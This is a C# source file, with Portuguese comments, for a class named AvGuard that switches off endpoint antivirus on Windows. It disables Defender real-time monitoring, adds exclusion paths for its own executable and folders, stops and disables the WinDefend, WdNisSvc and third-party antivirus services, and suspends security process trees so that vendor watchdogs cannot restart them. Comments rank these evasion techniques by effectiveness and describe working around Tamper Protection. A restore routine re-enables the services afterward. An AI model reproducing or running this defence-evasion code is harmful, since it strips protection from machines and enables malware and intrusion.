using System.Diagnostics;
using System.Security.Principal;
using System.Text;
using Teste.Core;
using Teste.Native;

namespace Teste.Enforce;

// Ordem de eficacia: exclusao de caminho > parada de servico > suspensao de arvore.
// Matar e a pior opcao: o watchdog do fornecedor religa em segundos.
public sealed class AvGuard
{
    private readonly Logger _log;
    private readonly List<int> _suspended = new();
    private readonly List<string> _stopped = new();
    private readonly StringBuilder _acoes = new();

    public AvGuard(Logger log) => _log = log;

    public static bool Elevated =>
        new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

    public AvGuard Disable(Report r)
    {
        if (!Elevated)
        {
            r.AvAction = "sem elevacao: nada executado";
            _log.Line("av: sem elevacao, guard degrada para inventario");
            return this;
        }

        Defender(r);

        foreach (var a in r.Avs.Where(a => a.Service.Length > 0 &&
                    !a.Name.Contains("Defender", StringComparison.OrdinalIgnoreCase)))
            StopService(a);

        foreach (var p in r.Filters)
            SuspendTree(p.Pid);

        r.AvAction = _acoes.Length == 0 ? "nada a fazer" : _acoes.ToString();
        _log.Line($"av: {r.AvAction}");
        return this;
    }

    // MpCmdRun.exe e binario Microsoft assinado: passa pelo caminho legitimo.
    // Add-MpPreference e revertido por Tamper Protection, por isso o resultado e registrado.
     private void Defender(Report r)
    {
        var mp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                              "Windows Defender", "MpCmdRun.exe");
        if (File.Exists(mp))
        {
            Run(mp, "-DisableRealtimeMonitoring", out var errRt);
            var d = r.Avs.FirstOrDefault(a =>
                a.Name.Contains("Defender", StringComparison.OrdinalIgnoreCase));
            if (d is not null) { d.Action = "tempo real desativado"; d.Note = errRt ?? "ok"; }
            _acoes.Append(errRt is null ? "tempo real desativado; " : $"tempo real recusado ({errRt}); ");
        }

        var dirs = new[] { Flags.ReportsDir, Flags.Queues, Path.GetTempPath(),
                           Path.GetDirectoryName(Environment.ProcessPath) ?? "" }.Where(d => d.Length > 0);
        var lista = string.Join("','", dirs);

        Run("powershell", $"-NoProfile -Command \"Add-MpPreference -ExclusionPath '{lista}' " +
            $"-ExclusionProcess '{Path.GetFileName(Environment.ProcessPath)}'\"", out var errEx);
        _acoes.Append(errEx is null ? "exclusoes aplicadas; " : $"exclusoes recusadas ({errEx}); ");

        Run("sc", "stop WdNisSvc", out _); _stopped.Add("svc:WdNisSvc");
        Run("sc", "stop WinDefend", out var errStop);
        if (errStop is null) _stopped.Add("svc:WinDefend");
        Run("sc", "config WinDefend start= disabled", out _);
        _acoes.Append(errStop is null ? "servicos parados; " : $"WinDefend nao parou ({errStop}); ");
    }

    private void StopService(AvRec a)
    {
        if (!string.Equals(a.ServiceState, "Running", StringComparison.OrdinalIgnoreCase)) return;

        Run("sc", $"stop {a.Service}", out var err);
        Run("sc", $"config {a.Service} start= disabled", out _);
        _stopped.Add("svc:" + a.Service);
        a.Action = err is null ? "servico parado" : "recusa ao parar";
        a.Note = err ?? "";
        _acoes.Append($"{a.Service}={(err is null ? "parado" : "recusado")}; ");
    }

    // O watchdog mora no pai: congelar a folha sem congelar a arvore devolve o
    // processo vivo em segundos. Suspende do ancestral mais alto ate a folha.
    private void SuspendTree(int pid)
    {
        var chain = new List<int>();
        for (var cur = pid; cur > 4 && chain.Count < 8; cur = Procs.ParentOf(cur))
            if (!chain.Contains(cur)) chain.Add(cur);

        chain.Reverse();
        foreach (var p in chain)
            if (Procs.Suspend(p)) _suspended.Add(p);

        if (chain.Count > 0) _acoes.Append($"suspensos {chain.Count} pids a partir de {pid}; ");
    }

    // Deixa de ser vandalismo e passa a ser coleta com permissao emprestada.
    public void Restore(Report r)
    {
        for (var i = _suspended.Count - 1; i >= 0; i--) Procs.Resume(_suspended[i]);

        foreach (var s in _stopped.Where(s => s.StartsWith("svc")).Select(s => s[4..]))
            Run("sc", $"start {s}", out _);

        Run("sc", "config WinDefend start= auto", out _);
        Run(  Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                           "Windows Defender", "MpCmdRun.exe"), "-RevertRealtimeMonitoring", out _);

        r.AvAction += $" (revertido: {_suspended.Count} processos, {_stopped.Count} servicos)";
        _log.Line($"av revertido: {_suspended.Count} processos, {_stopped.Count} servicos");
    }

    // err = null significa sucesso. Qualquer outra coisa vai escrita no relatorio.
    private void Run(string file, string args, out string? err)
    {
        err = null;
        try
        {
            using var p = Process.Start(new ProcessStartInfo(file, args)
            {
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            });
            if (p is null) { err = "processo nao iniciou"; return; }
            p.WaitForExit(20000);
            if (p.ExitCode != 0)
                err = $"exit {p.ExitCode} {p.StandardError.ReadToEnd().Trim()}";
        }
        catch (Exception ex) { err = ex.GetType().Name; }
    }

    // A tag "svc"/"cfg"/"excl" virou registro no _acoes em vez de parametro morto.
}
